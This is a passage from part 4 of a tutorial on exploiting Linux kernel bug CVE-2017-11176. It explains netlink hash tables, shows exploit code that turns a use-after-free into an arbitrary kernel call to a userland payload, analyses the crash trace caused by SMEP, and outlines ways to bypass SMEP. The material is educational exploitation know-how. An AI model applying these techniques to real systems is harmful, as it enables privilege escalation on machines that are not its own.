<span class="w">    </span><span class="n">hash</span><span class="o">-&gt;</span><span class="n">rehash_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jiffies</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">HZ</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>This function:</p><ol><li>is based on the <em>grow</em> parameter and computes a new <em>size</em> and <em>mask</em>. The number of buckets is multiplied by two at each growing operation</li><li>allocates a new array of <em>hlist_head</em> (i.e. new buckets)</li><li>updates the <em>rnd</em> value of the hash table. It means that <strong>the whole hash table is broken now</strong> because the hash function won't allow to retrieve the previous elements</li><li>walks the previous buckets and <strong>re-insert all elements</strong> into the new buckets using the new hash function</li><li>releases the previous bucket array and updates the <em>rehash_time</em>.</li></ol><p>Since the hash function has changed, that is why the "new bucket" is recomputed after dilution prior to inserting the element (in <em>netlink_insert()</em>).</p><h2 id="netlink-hash-table-summary">Netlink Hash Table Summary</h2><p>Let's sum up what we know about netlink hash table insertion so far:</p><ul><li>netlink has one hash table per protocol</li><li>each hash table starts with a single bucket</li><li>there is on average two elements per bucket</li><li>the table grows when there are (roughly) more than two elements per bucket</li><li>every time a hash table grows, its number of buckets is multiplied by two</li><li>when the hash table grows, its elements are "diluted"</li><li>while inserting an element into a bucket "more charged" than others, it provokes a dilution</li><li>elements are always inserted at the head of a bucket</li><li>when a dilution occurs, the hash function changed</li><li>the hash function uses a user-provided pid value and another unpredictable key</li><li>the hash function is supposed to be irreversible so we can't choose into which bucket an element will be inserted</li><li>any operation on ANY hash table is protected by a global lock (<em>netlink_table_grab()</em> and <em>netlink_table_ungrab()</em>)</li></ul><p>And some additional elements about removal (check <em>netlink_remove()</em>):</p><ul><li>once grown, <strong>a hash table is never shrinked</strong></li><li>a removal <strong>never</strong> provokes a dilution</li></ul><p>ALRIGHT! We are ready to move on and get back to our exploit!</p><hr><h1 id="meeting-supervisor-mode-execution-prevention">Meeting Supervisor Mode Execution Prevention</h1><p>In the previous article, we modified the PoC to exploit the <em>use-after-free</em> through <em>type confusion</em> [<strong>1</strong>]. With the reallocation we made the "fake" netlink sock's wait queue pointing to an element in userland [<strong>2</strong>].</p><p>Then, the <em>setsockopt()</em> syscall [<strong>3a</strong>] iterates over our userland wait queue element and calls the <em>func</em> function pointer [<strong>3b</strong>] that is <em>panic()</em> [<strong>3c</strong>] right now. This gave us a nice call trace to validate that we successfully achieved an <strong>arbitrary call</strong>.</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/arbitrary_call_0.png" title="arbitrary call Panic()"><figcaption class="figcaption figure-caption text-center">arbitrary_call_0.png</figcaption></figure><p></p><p>The call trace was something like:</p><div class="highlight"><pre><span></span><code>[  213.352742] Freeing alive netlink socket ffff88001bddb400
[  218.355229] Kernel panic - not syncing: ^A
[  218.355434] Pid: 2443, comm: exploit Not tainted 2.6.32
[  218.355583] Call Trace:
[  218.355689]  [&lt;ffffffff8155372b&gt;] ? panic+0xa7/0x179
[  218.355927]  [&lt;ffffffff810665b3&gt;] ? __wake_up+0x53/0x70
[  218.356045]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90
[  218.356156]  [&lt;ffffffff810665a8&gt;] ? __wake_up+0x48/0x70
[  218.356310]  [&lt;ffffffff814b81cc&gt;] ? netlink_setsockopt+0x13c/0x1c0
[  218.356460]  [&lt;ffffffff81475a2f&gt;] ? sys_setsockopt+0x6f/0xc0
[  218.356622]  [&lt;ffffffff8100b1a2&gt;] ? system_call_fastpath+0x16/0x1b
</code></pre></div><p>As we can see <em>panic()</em> is indeed called from the <em>curr-&gt;func()</em> function pointer in <em>__wake_up_common()</em>.</p><p><strong>NOTE</strong>: the second call to <em>__wake_up()</em> does not occur. It appears here because the arguments of <em>panic()</em> are a bit broken.</p><h2 id="returning-to-userland-code-first-try">Returning to userland code (first try)</h2><p>Alright, now let's try to return into userland (some call it <em>ret-to-user</em>).</p><p>One might ask: why returning into userland code? Except if your kernel is backdoored, it is unlikely that you will find <strong>a single function</strong> that directly elevates your privileges, repair the kernel, etc. We want to execute arbitrary code of our choice. Since we have an arbitrary call primitive, let's write our payload in the exploit and jump to it.</p><p>Let's modify the exploit and build a <em>payload()</em> function that in turn will call <em>panic()</em> (for testing purpose). Remember to change the <em>func</em> function pointer value:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_realloc_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="c1">// initialise the userland wait queue element</span>
<span class="w">  </span><span class="n">BUILD_BUG_ON</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="p">,</span><span class="w"> </span><span class="n">func</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">WQ_ELMT_FUNC_OFFSET</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">BUILD_BUG_ON</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">wait_queue</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">WQ_ELMT_TASK_LIST_OFFSET</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">;</span><span class="w"> </span><span class="c1">// set to exit after the first arbitrary call</span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">private</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// unused</span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">func</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">wait_queue_func_t</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">payload</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;----- userland addr instead of PANIC_ADDR</span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">task_list</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">list_head</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_fake_next_elt</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_uland_wq_elt addr = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_uland_wq_elt</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] g_uland_wq_elt.func = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">g_uland_wq_elt</span><span class="p">.</span><span class="n">func</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">panic</span><span class="p">)(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span><span class="w"></span>

<span class="c1">// The following code is executed in Kernel Mode.</span>
<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="p">((</span><span class="n">panic</span><span class="p">)(</span><span class="n">PANIC_ADDR</span><span class="p">))(</span><span class="s">""</span><span class="p">);</span><span class="w">  </span><span class="c1">// called from kernel land</span>

<span class="w">  </span><span class="c1">// need to be different than zero to exit list_for_each_entry_safe() loop</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">555</span><span class="p">;</span><span class="w"> </span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The previous diagram becomes:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/arbitrary_call_1.png" title="Arbitrary call panic() from userland"><figcaption class="figcaption figure-caption text-center">arbitrary_call_1.png</figcaption></figure><p></p><p>Try to launch it, and...</p><div class="highlight"><pre><span></span><code>[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4
[  124.962923] IP: [&lt;00000000004014c4&gt;] 0x4014c4
[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
[  124.963261] Oops: 0011 [#1] SMP 
...
[  124.966733] RIP: 0010:[&lt;00000000004014c4&gt;]  [&lt;00000000004014c4&gt;] 0x4014c4
[  124.966810] RSP: 0018:ffff88001b533e60  EFLAGS: 00010012
[  124.966851] RAX: 0000000000602880 RBX: 0000000000602898 RCX: 0000000000000000
[  124.966900] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602880
[  124.966948] RBP: ffff88001b533ea8 R08: 0000000000000000 R09: 00007f919c472700
[  124.966995] R10: 00007ffd8d9393f0 R11: 0000000000000202 R12: 0000000000000001
[  124.967043] R13: ffff88001bdf2ab8 R14: 0000000000000000 R15: 0000000000000000
[  124.967090] FS:  00007f919cc3c700(0000) GS:ffff880003200000(0000) knlGS:0000000000000000
[  124.967141] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  124.967186] CR2: 00000000004014c4 CR3: 000000001d01a000 CR4: 00000000001407f0
[  124.967264] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[  124.967334] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[  124.967385] Process exploit (pid: 2447, threadinfo ffff88001b530000, task ffff88001b4cd280)
[  124.968804] Stack:
[  124.969510]  ffffffff81061909 ffff88001b533e78 0000000100000001 ffff88001b533ee8
[  124.969629] &lt;d&gt; ffff88001bdf2ab0 0000000000000286 0000000000000001 0000000000000001
[  124.970492] &lt;d&gt; 0000000000000000 ffff88001b533ee8 ffffffff810665a8 0000000100000000
[  124.972289] Call Trace:
[  124.973034]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90
[  124.973898]  [&lt;ffffffff810665a8&gt;] __wake_up+0x48/0x70
[  124.975251]  [&lt;ffffffff814b81cc&gt;] netlink_setsockopt+0x13c/0x1c0
[  124.976069]  [&lt;ffffffff81475a2f&gt;] sys_setsockopt+0x6f/0xc0
[  124.976721]  [&lt;ffffffff8100b1a2&gt;] system_call_fastpath+0x16/0x1b
[  124.977382] Code:  Bad RIP value.
[  124.978107] RIP  [&lt;00000000004014c4&gt;] 0x4014c4
[  124.978770]  RSP &lt;ffff88001b533e60&gt;
[  124.979369] CR2: 00000000004014c4
[  124.979994] Tainting kernel with flag 0x7
[  124.980573] Pid: 2447, comm: exploit Not tainted 2.6.32
[  124.981147] Call Trace:
[  124.981720]  [&lt;ffffffff81083291&gt;] ? add_taint+0x71/0x80
[  124.982289]  [&lt;ffffffff81558dd4&gt;] ? oops_end+0x54/0x100
[  124.982904]  [&lt;ffffffff810527ab&gt;] ? no_context+0xfb/0x260
[  124.983375]  [&lt;ffffffff81052a25&gt;] ? __bad_area_nosemaphore+0x115/0x1e0
[  124.983994]  [&lt;ffffffff81052bbe&gt;] ? bad_area_access_error+0x4e/0x60
[  124.984445]  [&lt;ffffffff81053172&gt;] ? __do_page_fault+0x282/0x500
[  124.985055]  [&lt;ffffffff8106d432&gt;] ? default_wake_function+0x12/0x20
[  124.985476]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90
[  124.986020]  [&lt;ffffffff810665b3&gt;] ? __wake_up+0x53/0x70
[  124.986449]  [&lt;ffffffff8155adae&gt;] ? do_page_fault+0x3e/0xa0
[  124.986957]  [&lt;ffffffff81558055&gt;] ? page_fault+0x25/0x30                 // &lt;------
[  124.987366]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90
[  124.987892]  [&lt;ffffffff810665a8&gt;] ? __wake_up+0x48/0x70
[  124.988295]  [&lt;ffffffff814b81cc&gt;] ? netlink_setsockopt+0x13c/0x1c0
[  124.988781]  [&lt;ffffffff81475a2f&gt;] ? sys_setsockopt+0x6f/0xc0
[  124.989231]  [&lt;ffffffff8100b1a2&gt;] ? system_call_fastpath+0x16/0x1b
[  124.990091] ---[ end trace 2c697770b8aa7d76 ]---
</code></pre></div><p>Oops! As we can see in the call trace, it didn't quite hit the mark (the step 3 failed)! We will meet this kind of trace quite a lot, we better understand how to read it.</p><h2 id="understanding-page-fault-trace">Understanding Page Fault Trace</h2><p>Let's analyze the previous trace. This kind of trace comes from a <strong>page fault exception</strong>. That is, an exception generated by the CPU itself (i.e. hardware) while trying to access memory.</p><p>Under "normal" circumstances, a page fault exception can occur when:</p><ul><li>the CPU tries to access a page that is not present in RAM (legal access)</li><li>the access is "illegal": writing to read-only page, executing NX page, address does not belong to a <em>virtual memory area (VMA)</em>, etc.</li></ul><p>While being an "exception" CPU-wise, this actually occurs quite often during normal program life cycle. For instance, when you allocate memory with <em>mmap()</em>, the kernel does not allocate <em>physical</em> memory until you access it the very first time. This is called <strong>Demand Paging</strong>. This first access provokes a page fault, and it is the <em>page fault exception handler</em> that actually allocates a page frame. That's why you can virtually allocate more memory than the actual physical RAM (until you access it).</p><p>The following diagram (from <em>Understanding the Linux Kernel</em>) shows a simplified version of the page fault exception handler:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/page_fault_handler.png" title="Page Fault Handler"><figcaption class="figcaption figure-caption text-center">page_fault_handler.png</figcaption></figure><p></p><p>As we can see, <strong>if an illegal access occurs while being in Kernel Land, it can crash the kernel</strong>. This is where we are right now.</p><div class="highlight"><pre><span></span><code>[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4
[  124.962923] IP: [&lt;00000000004014c4&gt;] 0x4014c4
[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
[  124.963261] Oops: 0011 [#1] SMP 
...
[  124.979369] CR2: 00000000004014c4
</code></pre></div><p>The previous trace has a lot of information explaining the reason of the page fault exception. The <strong>CR2 register</strong> (same as IP here) holds the faulty address.</p><p>In our case, the MMU (hardware) failed to access memory address <strong>0x00000000004014c4</strong> (the <em>payload()</em> address). Because <em>IP</em> also points to it, we know that an exception is generated while trying to execute the <strong>curr-&gt;func()</strong> instruction in <em>__wake_up_common()</em>:</p><p>First, let's focus on the <strong>error code</strong> which is "0x11" in our case. The <em>error code</em> is a 64-bit value where the following bits can be set/clear:</p><div class="highlight"><pre><span></span><code><span class="c1">// [arch/x86/mm/fault.c]</span>

<span class="cm">/*</span>
<span class="cm"> * Page fault error code bits:</span>
<span class="cm"> *</span>
<span class="cm"> *   bit 0 ==    0: no page found   1: protection fault</span>
<span class="cm"> *   bit 1 ==    0: read access     1: write access</span>
<span class="cm"> *   bit 2 ==    0: kernel-mode access  1: user-mode access</span>
<span class="cm"> *   bit 3 ==               1: use of reserved bit detected</span>
<span class="cm"> *   bit 4 ==               1: fault was an instruction fetch</span>
<span class="cm"> */</span><span class="w"></span>
<span class="k">enum</span><span class="w"> </span><span class="n">x86_pf_error_code</span><span class="w"> </span><span class="p">{</span><span class="w"></span>

<span class="w">    </span><span class="n">PF_PROT</span><span class="w">     </span><span class="o">=</span><span class="w">       </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">PF_WRITE</span><span class="w">    </span><span class="o">=</span><span class="w">       </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">PF_USER</span><span class="w">     </span><span class="o">=</span><span class="w">       </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">PF_RSVD</span><span class="w">     </span><span class="o">=</span><span class="w">       </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="n">PF_INSTR</span><span class="w">    </span><span class="o">=</span><span class="w">       </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>That is, our <em>error_code</em> is:</p><div class="highlight"><pre><span></span><code><span class="p">((</span><span class="n">PF_PROT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PF_INSTR</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">PF_WRITE</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="n">PF_USER</span><span class="w"></span>
</code></pre></div><p>In other words, the page fault occurs:</p><ul><li>because of a <strong>protection fault</strong> (<em>PF_PROT</em> is set)</li><li>during an <strong>instruction fetch</strong> (<em>PF_INSTR</em> is set)</li><li>implying a <strong>read access</strong> (<em>PF_WRITE</em> is clear)</li><li>in <strong>kernel-mode</strong> (<em>PF_USER</em> is clear)</li></ul><p>Since the page where the faulty address belongs is <em>present</em> (<em>PF_PROT</em> is set), a <strong>Page Table Entry (PTE)</strong> exists. The later describes two things:</p><ul><li><em>Page Frame Number</em> (PFN)</li><li><strong>Page Flags</strong> like access rights, page is present status, User/Supervisor page, etc.</li></ul><p>In our case, the PTE value is <strong>0x111e3025</strong>:</p><div class="highlight"><pre><span></span><code>[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
</code></pre></div><p>If we mask out the PFN part of this value, we get <strong>0b100101</strong> (0x25). Let's code a basic program to extract information from the PTE's flags value:</p><div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="cp">#define __PHYSICAL_MASK_SHIFT 46</span>
<span class="cp">#define __PHYSICAL_MASK ((1ULL &lt;&lt; __PHYSICAL_MASK_SHIFT) - 1)</span>
<span class="cp">#define PAGE_SIZE 4096ULL</span>
<span class="cp">#define PAGE_MASK (~(PAGE_SIZE - 1))</span>
<span class="cp">#define PHYSICAL_PAGE_MASK (((signed long)PAGE_MASK) &amp; __PHYSICAL_MASK)</span>
<span class="cp">#define PTE_FLAGS_MASK (~PHYSICAL_PAGE_MASK)</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">pte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x111e3025</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">pte_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pte</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">PTE_FLAGS_MASK</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"PTE_FLAGS_MASK  = 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">PTE_FLAGS_MASK</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"pte             = 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">pte</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"pte_flags       = 0x%llx</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">pte_flags</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"present   = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">!!</span><span class="p">(</span><span class="n">pte_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)));</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"writable  = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">!!</span><span class="p">(</span><span class="n">pte_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)));</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"user      = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">!!</span><span class="p">(</span><span class="n">pte_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)));</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"acccessed = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">!!</span><span class="p">(</span><span class="n">pte_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">5</span><span class="p">)));</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"NX        = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="o">!!</span><span class="p">(</span><span class="n">pte_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="mi">1ULL</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">63</span><span class="p">)));</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: If you wonder where all those constants come from, search for the <em>PTE_FLAGS_MASK</em> and <em>_PAGE_BIT_USER</em> macros in <em>arch/x86/include/asm/pgtable_types.h</em>. It simply matches the Intel documentation (Table 4-19).</p><p>This program gives:</p><div class="highlight"><pre><span></span><code>PTE_FLAGS_MASK  = 0xffffc00000000fff
pte             = 0x111e3025
pte_flags       = 0x25

present   = 1
writable  = 0
user      = 1
acccessed = 1
NX        = 0
</code></pre></div><p>Let's match this information with the previous <em>error code</em>:</p><ol><li>The page the kernel is trying to access is already present, so the fault comes from an <strong>access right issue</strong></li><li>We are NOT trying to write to a read-only page</li><li>The NX bit is NOT set, so the page is executable</li><li>The page is user accessible which means, the kernel can also access it</li></ol><p>So, what's wrong?</p><p>In the previous list, the point <em>4)</em> is partially true. The kernel has the right to access User Mode pages but <strong>it cannot execute it</strong>! The reason being:</p><p><strong>Supervisor Mode Execution Prevention (SMEP).</strong></p><p>Prior to SMEP introduction, the kernel had all rights to do anything with userland pages. In Supervisor Mode (i.e. Kernel Mode), the kernel was allowed to both read/write/execute userland AND kernel pages. This is not true anymore!</p><p>SMEP exists since the <em>"Ivy Bridge"</em> Intel Microarchitecture (core i7, core i5, etc.) and the Linux kernel supports it since this <a href="https://lkml.org/lkml/2011/5/16/500">patch</a>. It adds a security mechanism that is enforced in hardware.</p><p>Let's look at the section <em>"4.6.1 - Determination of Access Rights"</em> from <a href="https://software.intel.com/sites/default/files/managed/7c/f1/253668-sdm-vol-3a.pdf">Intel System Programming Guide Volume 3a</a> which gives the complete sequence performed while checking if accessing a memory location is allowed or not. If not, a page fault exception is generated.</p><p>Since the fault occurs during the <em>setsockopt()</em> system call, we are in supervisor-mode:</p><div class="highlight"><pre><span></span><code>The following items detail how paging determines access rights:

• For supervisor-mode accesses:
  ... cut ...
  — Instruction fetches from user-mode addresses.
    Access rights depend on the values of CR4.SMEP:
    • If CR4.SMEP = 0, access rights depend on the paging mode and the value of IA32_EFER.NXE:
      ... cut ...
    • If CR4.SMEP = 1, instructions may not be fetched from any user-mode address.
</code></pre></div><p>Let's check the status of the <strong>CR4 register</strong>. The bit in <em>CR4</em> which represents the SMEP status is the bit 20:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/cr4.png" title="CR4"><figcaption class="figcaption figure-caption text-center">cr4.png</figcaption></figure><p></p><p>In Linux, the following macro is used:</p><div class="highlight"><pre><span></span><code><span class="c1">// [arch/x86/include/asm/processor-flags.h]</span>

<span class="cp">#define X86_CR4_SMEP    0x00100000 </span><span class="cm">/* enable SMEP support */</span><span class="cp"></span>
</code></pre></div><p>Hence:</p><div class="highlight"><pre><span></span><code>CR4 = 0x00000000001407f0
                  ^
                  +------ SMEP is enabled
</code></pre></div><p>That's it! <strong>SMEP just does its job denying us to return into userland code from kernel land</strong>.</p><p>Fortunately, <em>SMAP</em> (Supervisor Mode Access Protection), which forbids access to userland page from Kernel Mode, is disabled. It would force us to use another exploitation strategy (i.e. can't use a wait queue element in userland).</p><p><strong>WARNING</strong>: Some virtualization software (like <em>Virtual Box</em>) does not support SMEP. We don't know if it supports it at the time of writing. If the SMEP flag is not enabled in your lab, you might consider using another virtualization software (hint: <em>vmware</em> supports it).</p><p>In this section, we analyzed in deeper detail what information can be extracted from a page fault trace. It is important to understand it as we might need to explore it again later on (e.g. <em>prefaulting</em>). In addition, we understood why the exception was generated because of SMEP and how to detect it. Don't worry, like any security protection mechanism, there is a workaround :-).</p><hr><h1 id="defeating-smep-strategies">Defeating SMEP Strategies</h1><p>In the previous section, we tried to jump into userland code to execute the payload of our choice (i.e. arbitrary code execution). Unfortunately, we've been blocked by SMEP which provoked an unrecoverable page fault making the kernel crash.</p><p>In this section, we will present different strategies that can be used to defeat SMEP.</p><h2 id="dont-ret2user">Don't ret2user</h2><p>The most obvious way to bypass SMEP is to not return to user code at all and keep executing kernel code.</p><p>However, it is very unlikely that we find a single function in the kernel that:</p><ul><li>elevates our privileges and/or other "profits"</li><li>repairs the kernel</li><li>returns a non-zero value (required by the bug)</li></ul><p>Note in the current exploit, we are not actually bounded to a "single function". The reason is: <strong>we control the <em>func</em> field since it is located in userland</strong>. What we could do here is, calling one kernel function, modifying <em>func</em> and calling another function, etc. However, it brings two issues:</p><ol><li>We can't have the return value of the invoked function</li><li>We do not "directly" control the invoked function parameters</li></ol><p>There are tricks to exploit the arbitrary call this way, hence <strong>don't need to do any ROP</strong>, allowing a more "targetless" exploit. Those are out-of-topic here as we want to present a "common" way to use arbitrary calls.</p><p>Just like userland exploitation, we can use <em>return-oriented programming</em> technique. The problem is: writing a complex ROP-chain can be tedious (yet automatable). This will work nevertheless. Which leads us to...</p><h2 id="disabling-smep">Disabling SMEP</h2><p>As we've seen in the previous section, the status of SMEP (CR4.SMEP) is checked during a memory access. More specifically, when the CPU fetches an instruction belonging to userspace while in Kernel (Supervisor) mode. If we can <strong>flip this bit in CR4</strong>, we will be able to ret2user again.</p><p>This is what we will do in the exploit. First, we disable the SMEP bit using ROP, and then jump to user code. This will allow us to write our payload in C language.</p><h2 id="ret2dir">ret2dir</h2><p>The <em>ret2dir</em> attack exploits the fact that every user page has an equivalent address in kernel-land (called "synonyms"). Those synonyms are located in the <strong>physmap</strong>. The <em>physmap</em> is a direct mapping of all physical memory. The virtual address of the <em>physmap</em> is 0xffff880000000000 which maps the <em>page frame number (PFN)</em> zero (0xffff880000001000 is PFN#1, etc.). The term "physmap" seems to have appeared with the ret2dir attack, some people call it "linear mapping".</p><p>Alas, it is more complex to do it nowadays because <strong>/proc/&lt;PID&gt;/pagemap</strong> is not world readable anymore. It allowed to find the PFN of userland page, hence find the virtual address in 